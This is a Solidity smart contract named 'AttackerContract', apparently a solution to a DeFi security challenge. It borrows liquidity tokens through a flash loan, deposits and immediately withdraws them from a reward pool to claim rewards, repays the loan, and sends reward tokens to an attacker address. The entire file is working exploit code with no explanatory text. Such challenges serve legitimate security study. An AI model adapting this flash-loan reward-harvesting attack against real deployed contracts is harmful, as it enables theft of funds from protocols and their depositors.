pragma solidity ^0.6.0;

contract AttackerContract {
    address public flashLoanPool;
    address public rewardPool;
    address public liquidityToken;
    address public rewardToken;
    address public attacker;

    constructor(
        address _rewardPool,
        address _flashLoanPool,
        address _liquidityToken,
        address _rewardToken,
        address _attacker
    ) public {
        flashLoanPool = _flashLoanPool;
        rewardPool = _rewardPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        attacker = _attacker;
    }

    function getFlashLoan(uint256 amount) public {
        (bool success1, ) = flashLoanPool.call(
            abi.encodeWithSignature("flashLoan(uint256)", amount)
        );
        //(bool success3, bytes memory balance) = rewardToken.call(abi.encodeWithSignature("balanceOf(address)", attacker));
        (bool success2, ) = rewardToken.call(
            abi.encodeWithSignature("transfer(address,uint256)", attacker, 10)
        );
        require(success1, "flashLoan failed");
        require(success2, "transfer failed");
    }

    function receiveFlashLoan(uint256 amount) public {
        (bool success1, ) = liquidityToken.call(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                rewardPool,
                amount
            )
        );
        (bool success2, ) = rewardPool.call(
            abi.encodeWithSignature("deposit(uint256)", amount)
        );
        (bool success3, ) = rewardPool.call(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );
        (bool success4, ) = liquidityToken.call(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                msg.sender,
                amount
            )
        );
        require(
            success1 && success2 && success3 && success4,
            "receiveFlashLoan failed"
        );
    }
}
